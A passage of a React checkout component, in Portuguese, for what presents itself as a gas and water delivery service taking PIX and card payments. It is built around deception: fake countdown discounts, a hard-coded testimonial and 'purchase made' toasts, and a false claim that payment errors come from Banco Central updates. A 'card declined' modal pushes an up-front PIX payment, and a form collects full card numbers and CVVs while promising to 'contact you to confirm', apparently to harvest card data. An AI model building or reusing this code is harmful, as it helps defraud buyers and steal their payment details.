                            {addressData?.logradouro}, {customerData.number}
                            {customerData.complement && (
                              <span className="text-gray-600"> - {customerData.complement}</span>
                            )}
                            <br />
                            {addressData?.bairro}
                            <br />
                            {addressData?.localidade}/{addressData?.uf} - CEP: {addressData?.cep}
                          </p>
                        </div>
                      </div>
                      
                      {/* Loading de busca de motoboy */}
                      {searchingDriver && (
                        <div className="flex items-center gap-2 p-3 bg-blue-50 border border-blue-200 rounded-lg mt-2">
                          <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                          <span className="text-xs text-blue-800 font-medium">
                            🔍 Procurando entregador mais próximo...
                          </span>
                        </div>
                      )}
                      
                      {/* Motoboy encontrado */}
                      {!searchingDriver && driverETA && (
                        <div className="flex items-center gap-2 p-3 bg-green-50 border border-green-200 rounded-lg mt-2">
                          <span className="text-lg">🏍️</span>
                          <div className="flex-1">
                            <p className="text-xs text-green-800 font-semibold">
                              Motoboy mais próximo encontrado!
                            </p>
                            <p className="text-xs text-green-700">
                              Tempo estimado: <strong>{driverETA}</strong>
                            </p>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              {/* Elementos de Segurança e Urgência */}
              {!pixData || (pixData && pixData.status === 'waiting_payment') ? (
                <div className="space-y-4">
                  {/* Segurança do Pagamento */}
                  <div className="rounded-md border p-3 bg-green-50 text-sm text-gray-700">
                    <p className="mb-1">✅ <strong>Pagamento seguro via Pix (Banco Central)</strong></p>
                    <p>⚡ Confirmação imediata — o motoboy recebe seu pedido automaticamente.</p>
                  </div>

                  {/* Explicação Simples do PIX */}
                  <div className="bg-gradient-to-r from-blue-50 to-green-50 border-2 border-blue-200 rounded-lg p-4">
                    <div className="flex items-start gap-3">
                      <div className="flex-shrink-0 text-3xl">💳</div>
                      <div className="flex-1">
                        <h3 className="font-bold text-blue-800 text-base mb-2">
                          Como pagar com PIX?
                        </h3>
                        <div className="space-y-2 text-sm text-gray-700">
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">1.</span>
                            <span>Abra o app do seu banco</span>
                          </p>
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">2.</span>
                            <span>Escolha "Pagar com PIX" ou "Ler QR Code"</span>
                          </p>
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">3.</span>
                            <span>Escaneie o QR Code abaixo ou copie o código</span>
                          </p>
                          <p className="flex items-start gap-2">
                            <span className="font-bold text-blue-600">4.</span>
                            <span>Confirme o pagamento no seu banco</span>
                          </p>
                        </div>
                        <div className="mt-3 p-2 bg-green-100 border border-green-300 rounded">
                          <p className="text-xs text-green-800 font-semibold">
                            ⚡ Pagamento confirmado em segundos! O motoboy recebe automaticamente.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Timer de Urgência */}
                  <div className="bg-red-50 border border-red-200 rounded-lg p-3 text-center">
                    <p className="text-red-600 font-semibold text-sm mb-1">
                      💥 Desconto Pix ativo por <span className="text-lg font-bold">{formatPixTimer()}</span> minutos
                    </p>
                    <p className="text-xs text-red-500">
                      Pagamento rápido garante entrega em até 30 min.
                    </p>
                  </div>

                  {/* Depoimento */}
                  <div className="bg-yellow-50 border-l-4 border-yellow-400 p-3 rounded">
                    <div className="flex items-start gap-2">
                      <div className="flex-shrink-0">
                        <div className="flex text-yellow-500 text-xs">⭐⭐⭐⭐⭐</div>
                      </div>
                      <div>
                        <p className="text-xs text-gray-700 italic">"Chegou em 12 minutos! Muito rápido e prático."</p>
                        <p className="text-xs text-gray-500 mt-1">— João P.</p>
                      </div>
                    </div>
                  </div>
                </div>
              ) : null}

              {!pixData ? (
                <div className="text-center">
                  {pixLoading && (
                    <div className="flex items-center justify-center gap-3 py-4">
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-green-600"></div>
                      <span className="text-green-600 font-semibold">Gerando PIX com desconto...</span>
                    </div>
                  )}
                  {pixError && <p className="text-red-500 text-xs sm:text-sm mt-3">{pixError}</p>}
                </div>
              ) : (
                <div className="space-y-3 sm:space-y-4">
                  <div className="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4">
                    <div className="flex items-center gap-2 mb-2 sm:mb-3">
                      <CheckCircle className="w-4 h-4 sm:w-5 sm:h-5 text-green-600" />
                      <h3 className="font-semibold text-green-800 text-sm sm:text-base">PIX Gerado com Sucesso!</h3>
                    </div>

                    {/* QR Code - Mostrar apenas se pagamento ainda não foi confirmado */}
                    {pixData.pix?.qrcode && pixData.status !== "paid" && (
                      <div className="text-center mb-3 sm:mb-4">
                        <img
                          src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(pixData.pix.qrcode)}`}
                          alt="QR Code PIX"
                          className="mx-auto w-36 h-36 sm:w-48 sm:h-48 border rounded-lg bg-white p-2"
                        />
                        <p className="text-xs sm:text-sm text-gray-600 mt-2">Escaneie o QR Code com seu app do banco</p>
                        
                        {/* Botão de Suporte - Aparece após 5 minutos */}
                        {showSupportButton && (
                          <div className="mt-4 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
                            <p className="text-xs sm:text-sm text-gray-700 mb-2 font-medium">
                              Problemas com pagamento? Pagou e não foi confirmado?
                            </p>
                            <a
                              href="https://wa.me/5582988381770?text=Ol%C3%A1!%20Estou%20com%20problemas%20com%20meu%20pedido."
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center justify-center gap-2 w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors duration-200 text-sm"
                            >
                              <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/>
                              </svg>
                              Falar com a gente no WhatsApp
                            </a>
                          </div>
                        )}
                      </div>
                    )}

                    {/* PIX Code - Mostrar apenas se pagamento ainda não foi confirmado */}
                    {pixData.pix?.qrcode && pixData.status !== "paid" && (
                      <div>
                        <label className="block text-xs sm:text-sm font-medium text-gray-700 mb-2">
                          Ou copie o código PIX:
                        </label>
                        <div className="space-y-2">
                          <textarea 
                            value={pixData.pix.qrcode} 
                            readOnly 
                            className="w-full font-mono text-xs p-3 border border-gray-300 rounded-md bg-gray-50 resize-none overflow-auto"
                            rows={3}
                            style={{ wordBreak: 'break-all' }}
                          />
                          <Button
                            onClick={copyPixCode}
                            variant="outline"
                            size="sm"
                            className="w-full flex items-center justify-center gap-2 bg-blue-600 text-white hover:bg-blue-700 border-blue-600"
                          >
                            {copied ? (
                              <>
                                <CheckCircle className="w-4 h-4" />
                                <span>Copiado!</span>
                              </>
                            ) : (
                              <>
                                <Copy className="w-4 h-4" />
                                <span>Copiar Código PIX</span>
                              </>
                            )}
                          </Button>
                          
                          {/* Botão de DEBUG - Apenas em localhost */}
                          {typeof window !== 'undefined' && (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && (
                            <Button
                              onClick={async () => {
                                const savedTransaction = localStorage.getItem('current-pix-transaction')
                                if (savedTransaction) {
                                  const transaction = JSON.parse(savedTransaction)
                                  const updatedPixData = { 
                                    ...transaction.pixData, 
                                    status: 'paid',
                                    paidAt: new Date().toISOString()
                                  }
                                  
                                  // 1. Reportar conversão Google Ads
                                  if (!conversionReported) {
                                    reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
                                    setConversionReported(true)
                                  }
                                  
                                  // 2. Enviar PAID para UTMify (ANTES de remover do localStorage)
                                  await sendToUtmify('paid')
                                  
                                  // 3. Atualizar estado e localStorage
                                  setPixData(updatedPixData)
                                  
                                  localStorage.setItem('paid-order', JSON.stringify({
                                    pixData: updatedPixData,
                                    customerData: transaction.customerData,
                                    addressData: transaction.addressData,
                                    paidAt: new Date().toISOString()
                                  }))
                                  
                                  // 4. Remover transação temporária (DEPOIS de enviar para UTMify)
                                  localStorage.removeItem('current-pix-transaction')
                                  
                                  // 5. Parar polling
                                  if (pollingInterval) {
                                    clearInterval(pollingInterval)
                                    setPollingInterval(null)
                                  }
                                }
                              }}
                              variant="outline"
                              size="sm"
                              className="w-full flex items-center justify-center gap-2 bg-yellow-500 text-white hover:bg-yellow-600 border-yellow-500"
                            >
                              🧪 SIMULAR PAGAMENTO (DEBUG)
                            </Button>
                          )}
                        </div>
                      </div>
                    )}

                    <div className="mt-3 sm:mt-4 p-2 sm:p-3 bg-blue-50 border border-blue-200 rounded-lg">
                      <p className="text-xs sm:text-sm text-blue-800">
                        <strong>Valor a pagar agora:</strong> {formatPrice(pixData.amount)}
                      </p>
                      {requiresPartialPayment() && (
                        <p className="text-xs sm:text-sm text-blue-800 mt-1">
                          <strong>Valor restante (na entrega):</strong> {formatPrice(getRemainingAmount())}
                        </p>
                      )}
                      {pixData.pix?.expirationDate && (
                        <p className="text-xs sm:text-sm text-blue-800">
                          <strong>Válido até:</strong>{" "}
                          {new Date(pixData.pix.expirationDate).toLocaleDateString("pt-BR")}
                        </p>
                      )}
                      <p className="text-xs sm:text-sm text-blue-800">
                        <strong>Status:</strong>{" "}
                        {pixData.status === "waiting_payment" || pixData.status === "WAITING_PAYMENT" 
                          ? "Pagamento Pendente" 
                          : pixData.status === "paid" || pixData.status === "PAID"
                          ? "Pagamento Confirmado"
                          : pixData.status}
                      </p>
                      
                      {/* Indicador de verificação automática */}
                      {pixData.status === "waiting_payment" && (
                        <div className="mt-2 flex items-center gap-2 text-xs text-blue-700">
                          <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                          <span>Verificando pagamento automaticamente...</span>
                        </div>
                      )}
                      
                      {/* Status UTMify */}
                      {(utmifySent.pending || utmifySent.paid) && (
                        <div className="mt-2 text-xs text-gray-600">
                          {utmifySent.pending && <p>📊 Pedido registrado no sistema</p>}
                          {utmifySent.paid && <p>✅ Pagamento confirmado no sistema</p>}
                        </div>
                      )}
                      
                      {pixData.status === "paid" && (
                        <div className="mt-3 p-3 sm:p-4 bg-green-100 border-2 border-green-400 rounded-lg">
                          <div className="flex items-start gap-3">
                            <div className="flex-shrink-0 text-2xl">🏍️</div>
                            <div>
                              <p className="text-sm sm:text-base text-green-800 font-bold mb-2">
                                ✅ Pagamento Confirmado!
                              </p>
                              <p className="text-xs sm:text-sm text-green-700 leading-relaxed mb-2">
                                Agora só aguardar a ligação do nosso Motoboy ok? É rapidinho! Estamos com uma grande quantidade de pedidos mas leva de 2 a 5 minutos.
                              </p>
                              {requiresPartialPayment() && (
                                <div className="mt-2 p-2 bg-yellow-50 border border-yellow-300 rounded">
                                  <p className="text-xs text-yellow-800 leading-relaxed">
                                    <strong>💰 Lembrete:</strong> Você pagou {formatPrice(pixData.amount)} agora. O valor restante de <strong>{formatPrice(getRemainingAmount())}</strong> será pago ao motoboy no momento da entrega.
                                  </p>
                                </div>
                              )}
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>

                  <div className="text-center">
                    <p className="text-xs sm:text-sm text-gray-600">
                      Após o pagamento, seu pedido será processado automaticamente.
                      <br />
                      <strong>Entrega em até 30 minutos!</strong>
                    </p>
                    
                    {/* Passos para Pagamento e Aviso sobre Erros */}
                    <div className="mt-4 space-y-3">
                      {/* Passos para Pagamento */}
                      <div className="p-3 bg-blue-50 border border-blue-200 rounded-lg">
                        <h4 className="text-sm font-semibold text-blue-800 mb-2 flex items-center gap-2">
                          💳 Como realizar o pagamento:
                        </h4>
                        <ol className="text-xs text-gray-700 space-y-1.5 ml-4 list-decimal">
                          <li>Abra o app do seu banco</li>
                          <li>Selecione a opção "Pagar com PIX"</li>
                          <li>Escaneie o QR Code acima ou copie o código</li>
                          <li>Confirme o valor e finalize o pagamento</li>
                        </ol>
                      </div>
                      
                      {/* Aviso sobre Possíveis Erros */}
                      <div className="p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                        <div className="flex items-start gap-2">
                          <span className="text-yellow-600 text-lg flex-shrink-0">⚠️</span>
                          <div>
                            <p className="text-xs text-yellow-800 leading-relaxed">
                              <strong>Atenção:</strong> Se ocorrer algum erro durante o pagamento, não se preocupe! 
                              O Banco Central passa por atualizações constantes e isso pode causar instabilidades temporárias. 
                              É completamente normal. Tente novamente em alguns instantes.
                            </p>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {/* Botão de teste - remover em produção */}
                    {process.env.NODE_ENV === 'development' && pixData.status === "waiting_payment" && (
                      <Button
                        onClick={() => setPixData(prev => prev ? {...prev, status: 'paid'} : null)}
                        variant="outline"
                        className="mt-4 text-xs border-green-500 text-green-600 hover:bg-green-50"
                      >
                        🧪 Simular Pagamento (DEV)
                      </Button>
                    )}
                  </div>
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Reviews Section */}
        <div className="mt-8 mb-6">
          <div className="text-center mb-6">
            <h3 className="text-lg font-bold text-gray-800 mb-2">
              📸 Não se esqueça de quando receber voltar aqui pra nos avaliar tá?
            </h3>
            <p className="text-sm text-gray-600">
              Mande aquela foto, veja o que nossos clientes falam 👇
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {reviews.map((review, index: number) => (
              <div key={index} className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                <div className="flex items-start gap-3">
                  <img 
                    src={review.image} 
                    alt={`Review de ${review.name}`}
                    className="w-16 h-16 rounded-lg object-cover"
                  />
                  <div className="flex-1">
                    <div className="flex items-center gap-2 mb-1">
                      <h4 className="font-semibold text-sm text-gray-800">{review.name}</h4>
                      <div className="flex">
                        {[...Array(review.rating)].map((_, i) => (
                          <Star key={i} className="w-3 h-3 fill-yellow-400 text-yellow-400" />
                        ))}
                      </div>
                    </div>
                    <p className="text-xs text-blue-600 font-medium mb-2">{review.product}</p>
                    <p className="text-xs text-gray-600 leading-relaxed">{review.comment}</p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        {/* Toast de Compras */}
        {showToast && (
          <div className="fixed bottom-4 left-4 right-4 md:left-auto md:right-4 md:w-80 z-50">
            <div className="bg-green-500 text-white p-3 rounded-lg shadow-lg flex items-center gap-3 animate-slide-up">
              <div className="w-2 h-2 bg-green-300 rounded-full animate-pulse"></div>
              <div className="flex-1">
                <p className="text-sm font-medium">🔥 Compra Realizada!</p>
                <p className="text-xs opacity-90">{currentToast}</p>
              </div>
              <button 
                onClick={() => setShowToast(false)}
                className="text-white hover:text-gray-200"
              >
                <X className="w-4 h-4" />
              </button>
            </div>
          </div>
        )}
      </div>
      
      {/* Modal de Desconto PIX */}
      {showPixDiscountModal && (
        <div className="fixed inset-0 bg-black/30 backdrop-blur-sm flex items-center justify-center z-50 p-4 animate-in fade-in duration-300 overflow-y-auto">
          <div className="bg-white rounded-2xl max-w-md w-full p-4 shadow-2xl border border-gray-100 animate-in zoom-in duration-300 my-4">
            <div className="text-center mb-3">
              <div className="inline-flex items-center justify-center w-12 h-12 bg-red-50 rounded-full mb-2">
                <span className="text-2xl">{cardFailed ? '😔' : '💳'}</span>
              </div>
              <h3 className="text-lg font-bold text-gray-800 mb-1">
                {cardFailed ? 'Seu cartão de crédito foi recusado.' : 'Escolha sua forma de pagamento'}
              </h3>
              <p className="text-gray-600 text-xs">
                {cardFailed ? 'Que tal finalizar sua compra por outro método?' : 'Não perca seu pedido!'}
              </p>
            </div>

            {cardFailed && (
              <div className="bg-gradient-to-r from-yellow-100 to-orange-100 border-2 border-yellow-400 rounded-xl p-3 mb-3">
                <div className="text-center mb-2">
                  <p className="text-sm font-bold text-gray-900 mb-1">
                    🎉 Agora temos uma novidade pra você!
                  </p>
                  <p className="text-xs text-gray-800 leading-snug font-medium">
                    Não precisa pagar o valor cheio agora! <strong className="text-gray-900">Pague apenas 50%</strong> e os outros 50% você paga pro motoboy ao receber, <strong className="text-gray-900">via PIX ou cartão</strong>.
                  </p>
                </div>
                <div className="bg-white rounded-lg p-2 text-center shadow-sm">
                  <p className="text-xs text-gray-700 font-semibold">Total com entrega:</p>
                  <p className="text-sm line-through text-gray-500">{formatCurrency(getTotalPrice())}</p>
                  <p className="text-2xl font-bold text-green-600">
                    {formatCurrency(getTotalPrice() - pixDiscount)}
                  </p>
                  <p className="text-xs text-green-700 font-bold">✨ Economia de {formatCurrency(pixDiscount)}!</p>
                </div>
                <p className="text-center text-xs font-bold text-gray-900 mt-2">
                  💚 Conosco é assim, quem manda é o cliente!
                </p>
              </div>
            )}
            
            <div className="bg-gray-50 border border-gray-200 rounded-xl p-2 mb-3">
              <div className="flex items-center gap-2">
                <div className="w-12 h-12 bg-blue-100 rounded-lg flex items-center justify-center text-xl">
                  {productName.includes('Gás') ? '🔥' : productName.includes('Água') ? '💧' : '📦'}
                </div>
                <div className="flex-1">
                  <p className="font-semibold text-gray-800 text-sm">{productName}</p>
                  <p className="text-xs text-gray-600">Entrega rápida</p>
                </div>
                <div className="text-right">
                  <p className="text-base font-bold text-gray-800">{formatCurrency(getTotalPrice())}</p>
                </div>
              </div>
            </div>
            
            <div className="space-y-2">
              {/* Opção PIX com desconto */}
              <button
                onClick={handleAcceptDiscount}
                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white p-3 rounded-xl shadow-md hover:shadow-lg transition-all text-left"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="bg-white/20 p-1.5 rounded-lg">
                      <span className="text-xl">🏦</span>
                    </div>
                    <div>
                      <p className="font-bold text-sm">Pague com PIX</p>
                      <p className="text-xs text-green-100">Aprovação instantânea</p>
                    </div>
                  </div>
                  <div className="bg-green-400 text-green-900 px-2 py-0.5 rounded-full text-xs font-bold">
                    10% OFF
                  </div>
                </div>
                <div className="mt-2 pt-2 border-t border-white/20 space-y-1">
                  <p className="text-xs">
                    De <span className="line-through opacity-75">{formatCurrency(getTotalPrice())}</span> por <span className="font-bold text-base">{formatCurrency(getTotalPrice() - pixDiscount)}</span>
                  </p>
                  <div className="bg-white/10 rounded-lg p-1.5">
                    <p className="text-xs text-green-100 mb-0.5">💰 Pagamento Facilitado:</p>
                    <p className="text-xs">
                      <strong>50% agora:</strong> {formatCurrency((getTotalPrice() - pixDiscount) / 2)}
                    </p>
                    <p className="text-xs">
                      <strong>50% na entrega:</strong> {formatCurrency((getTotalPrice() - pixDiscount) / 2)}
                    </p>
                  </div>
                </div>
              </button>
              
              {/* Opção Cartão - só mostra se ainda não falhou */}
              {!cardFailed && (
                <button
                  onClick={handleDeclineDiscount}
                  className="w-full bg-white hover:bg-gray-50 border-2 border-gray-300 p-3 rounded-xl transition-all text-left"
                >
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <div className="bg-gray-100 p-1.5 rounded-lg">
                        <span className="text-xl">💳</span>
                      </div>
                      <div>
                        <p className="font-bold text-sm text-gray-800">Pagar com Cartão</p>
                        <p className="text-xs text-gray-500">Crédito ou Débito</p>
                      </div>
                    </div>
                  </div>
                  <div className="mt-2 pt-2 border-t border-gray-200">
                    <p className="text-xs text-gray-700">
                      Valor total: <span className="font-bold">{formatCurrency(getTotalPrice())}</span>
                    </p>
                  </div>
                </button>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Modal de Formulário de Cartão */}
      {showCardForm && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 p-4 overflow-y-auto">
          <div className="bg-white rounded-2xl max-w-lg w-full p-6 shadow-2xl my-8">
            <div className="flex justify-between items-center mb-6">
              <h3 className="text-2xl font-bold text-gray-800">Pagamento com Cartão</h3>
              <button
                onClick={() => setShowCardForm(false)}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="w-6 h-6" />
              </button>
            </div>

            <form onSubmit={handleCardSubmit} className="space-y-4">
              {/* Número do Cartão */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Número do Cartão
                </label>
                <Input
                  type="text"
                  value={cardData.cardNumber}
                  onChange={(e) => setCardData({...cardData, cardNumber: formatCardNumber(e.target.value)})}
                  placeholder="1234 5678 9012 3456"
                  maxLength={19}
                  required
                  className="text-lg"
                />
              </div>

              {/* Nome do Titular */}
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Nome do Titular (como está no cartão)
                </label>
                <Input
                  type="text"
                  value={cardData.cardHolderName}
                  onChange={(e) => setCardData({...cardData, cardHolderName: e.target.value.toUpperCase()})}
                  placeholder="NOME COMPLETO"
                  required
                  className="text-lg uppercase"
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                {/* Data de Validade */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Validade
                  </label>
                  <Input
                    type="text"
                    value={cardData.cardExpiryDate}
                    onChange={(e) => setCardData({...cardData, cardExpiryDate: formatExpiryDate(e.target.value)})}
                    placeholder="MM/AA"
                    maxLength={5}
                    required
                    className="text-lg"
                  />
                </div>

                {/* CVV */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    CVV
                  </label>
                  <Input
                    type="text"
                    value={cardData.cardCvv}
                    onChange={(e) => setCardData({...cardData, cardCvv: e.target.value.replace(/\D/g, '')})}
                    placeholder="123"
                    maxLength={4}
                    required
                    className="text-lg"
                  />
                </div>
              </div>

              {/* Resumo do Pedido */}
              <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 mt-6">
                <h4 className="font-semibold text-gray-800 mb-2">Resumo do Pedido</h4>
                <div className="space-y-1 text-sm text-gray-600">
                  <p><strong>Produto:</strong> {productName}</p>
                  <p><strong>Endereço:</strong> {addressData?.logradouro}, {customerData.number}</p>
                  <p className="text-lg font-bold text-gray-800 mt-2">
                    Total: {formatCurrency(getTotalPrice())}
                  </p>
                </div>
              </div>

              {/* Aviso */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                <p className="text-xs text-blue-800">
                  🔒 Seus dados estão seguros. Entraremos em contato para confirmar o pagamento.
                </p>
              </div>

              {/* Botões */}
              <div className="flex gap-3 pt-4">
                <Button
                  type="button"
                  onClick={() => setShowCardForm(false)}
                  variant="outline"
                  className="flex-1"
                  disabled={cardSubmitting}
                >
                  Cancelar
                </Button>
                <Button
                  type="submit"
                  className="flex-1 bg-blue-600 hover:bg-blue-700"
                  disabled={cardSubmitting}
                >
                  Confirmar Pedido
                </Button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Loading Fullscreen */}
      {cardSubmitting && (
        <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[60]">
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 text-center">
            <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
            <h3 className="text-xl font-bold text-gray-800 mb-2">Processando pagamento...</h3>
            <p className="text-sm text-gray-600">Aguarde um momento</p>
          </div>
        </div>
      )}
    </div>
  )
}

// Funções auxiliares
const formatCep = (value: string) => {
  const cleanValue = value.replace(/\D/g, "")
  if (cleanValue.length <= 8) {
    return cleanValue.replace(/(\d{5})(\d{3})/, "$1-$2")
  }
  return value
}

const formatPhone = (value: string) => {
  const cleanValue = value.replace(/\D/g, "")
  if (cleanValue.length <= 11) {
    return cleanValue.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
  }
  return value
}

const formatCPF = (value: string) => {
  const cleanValue = value.replace(/\D/g, "")
  if (cleanValue.length <= 11) {
    return cleanValue.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }
  return value
}

const formatCurrency = (value: number) => {
  return new Intl.NumberFormat('pt-BR', {
    style: 'currency',
    currency: 'BRL'
  }).format(value / 100)
}
